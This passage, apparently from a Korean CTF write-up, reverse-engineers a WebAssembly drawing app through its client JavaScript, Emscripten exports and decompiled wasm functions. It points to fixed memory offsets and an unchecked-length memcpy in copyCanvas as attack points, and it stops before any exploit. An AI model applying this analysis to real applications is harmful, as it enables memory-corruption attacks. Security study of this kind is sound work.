+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;layers&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;change&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_setLayer</span>(parseInt(<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">value</span>));
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;name&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;input&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">_setName</span>(<span style="color:#a6e22e">strToCharArr</span>(<span style="color:#a6e22e">name</span>), <span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">length</span>);
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;save&#39;</span>).<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">out</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">height</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">layerPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_getLayer</span>(<span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">layer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">Module</span>.<span style="color:#a6e22e">HEAPU8</span>.<span style="color:#a6e22e">buffer</span>, <span style="color:#a6e22e">layerPtr</span>, <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">height</span>);
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">layer</span>, <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">height</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">binary</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(String.<span style="color:#a6e22e">fromCharCode</span>(...<span style="color:#a6e22e">out</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;name&#39;</span>).<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/save&#39;</span>, {
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>                    },
+</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">name</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">img</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">binary</span>
+</span></span><span style="display:flex;"><span>                    })
+</span></span><span style="display:flex;"><span>                }).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">clipboard</span>.<span style="color:#a6e22e">writeText</span>(<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">url</span>);
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Save URL copied to clipboard!&#39;</span>);
+</span></span><span style="display:flex;"><span>                    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Failed to save!&#39;</span>);
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                });
+</span></span><span style="display:flex;"><span>            })
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/index.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>저장할때 /save로 보내는 것을 알 수 있다.<br>
+wasm function들을 사용해서 처리한다.<br>
+index.js에서 export 하는 부분을 확인할 수 있다.</p>
+<h3 id="indexjs">index.js<a hidden class="anchor" aria-hidden="true" href="#indexjs">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">asm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createWasm</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">___wasm_call_ctors</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;__wasm_call_ctors&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_getName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_getName&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;getName&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_getLayer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_getLayer&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;getLayer&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_setName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_setName&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;setName&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_free</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;free&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_copyCanvas</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_copyCanvas&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;copyCanvas&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_setColor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_setColor&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;setColor&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_setLayer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_setLayer&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;setLayer&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_toggleLeftMouseButton</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_toggleLeftMouseButton&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;toggleLeftMouseButton&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_draw</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_draw&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;draw&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_clearCanvas</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_clearCanvas&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;clearCanvas&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_loop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_loop&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;loop&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_main</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_main&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;main&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_malloc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;malloc&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">___errno_location</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;__errno_location&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">___dl_seterr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;__dl_seterr&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_fflush</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;_fflush&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">createExportWrapper</span>(<span style="color:#e6db74">&#34;fflush&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_emscripten_stack_init</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">_emscripten_stack_init</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;asm&#34;</span>][<span style="color:#e6db74">&#34;emscripten_stack_init&#34;</span>]).<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_emscripten_stack_get_free</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">_emscripten_stack_get_free</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;asm&#34;</span>][<span style="color:#e6db74">&#34;emscripten_stack_get_free&#34;</span>]).<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_emscripten_stack_get_base</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">_emscripten_stack_get_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;asm&#34;</span>][<span style="color:#e6db74">&#34;emscripten_stack_get_base&#34;</span>]).<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/** @type {function(...*):?} */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_emscripten_stack_get_end</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">_emscripten_stack_get_end</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Module</span>[<span style="color:#e6db74">&#34;asm&#34;</span>][<span style="color:#e6db74">&#34;emscripten_stack_get_end&#34;</span>]).<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>대충 함수 export를 해준다.</p>
+<h3 id="indexwasm">index.wasm<a hidden class="anchor" aria-hidden="true" href="#indexwasm">#</a></h3>
+<p>아래 디컴파일러를 사용해서 분석했다.<br>
+wabt보다 훨씬 좋다.<br>
+<a href="https://github.com/wasmkit/diswasm">https://github.com/wasmkit/diswasm</a></p>
+<p>wasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다.<br>
+wasm은 따로 ASLR 같은 메모리 보호 기법이 없다.<br>
+global variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.</p>
+<h4 id="setname">setName()<a hidden class="anchor" aria-hidden="true" href="#setname">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// O[0] Decompilation of $func238, known as $func5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#e6db74">&#34;setName&#34;</span>; <span style="color:#75715e">// $func238 is exported to &#34;setName&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func5</span>(<span style="color:#66d9ef">int</span> arr, <span style="color:#66d9ef">int</span> param1) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> ar;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_8;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_4;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ar <span style="color:#f92672">=</span> arr;
+</span></span><span style="display:flex;"><span>  local_8 <span style="color:#f92672">=</span> param1;
+</span></span><span style="display:flex;"><span>  label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((((local_8 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  local_8 <span style="color:#f92672">=</span> local_8;
+</span></span><span style="display:flex;"><span>  local_4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((((local_4 <span style="color:#f92672">&lt;</span> local_8) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) local_4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2191c</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) (ar <span style="color:#f92672">+</span> local_4));
+</span></span><span style="display:flex;"><span>      local_4 <span style="color:#f92672">=</span> (local_4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span> label<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span> ;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) local_8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2191c</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">free</span>(ar);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>0x2191c가 Name이다.</p>
+<h4 id="copycanvas">copyCanvas()<a hidden class="anchor" aria-hidden="true" href="#copycanvas">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// O[0] Decompilation of $func239, known as $func6
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#e6db74">&#34;copyCanvas&#34;</span>; <span style="color:#75715e">// $func239 is exported to &#34;copyCanvas&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func6</span>(<span style="color:#66d9ef">int</span> target, <span style="color:#66d9ef">int</span> length) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> t;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0x8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> l;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  t <span style="color:#f92672">=</span> target;
+</span></span><span style="display:flex;"><span>  l <span style="color:#f92672">=</span> length;
+</span></span><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">memcpy</span>((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>), t, l); <span style="color:#75715e">// 0x21924 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">free</span>(t);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>0x21924에 length 만큼 복사한다.</p>
+<h4 id="getlayer">getLayer()<a hidden class="anchor" aria-hidden="true" href="#getlayer">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// O[0] Decompilation of $func237, known as $func4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#e6db74">&#34;getLayer&#34;</span>; <span style="color:#75715e">// $func237 is exported to &#34;getLayer&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func4</span>(<span style="color:#66d9ef">int</span> param0) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// offset=0xc
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local_c <span style="color:#f92672">=</span> param0;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ((<span style="color:#ae81ff">0x2091c</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1008</span>) <span style="color:#f92672">+</span> (local_c <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0xc</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>0x21924가 Layer인 것 같다.</p>
+<h4 id="main">main()<a hidden class="anchor" aria-hidden="true" href="#main">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// O[2] Disassembly of $func248, known as $func15
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>export <span style="color:#e6db74">&#34;main&#34;</span>; <span style="color:#75715e">// $func248 is exported to &#34;main&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func15</span>(<span style="color:#66d9ef">int</span> param0, <span style="color:#66d9ef">int</span> param1) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  local2 <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func13</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="func13">func13()<a hidden class="anchor" aria-hidden="true" href="#func13">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// O[2] Disassembly of $func246, known as $func13
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#a6e22e">func13</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local0;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// local index=1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> local1;
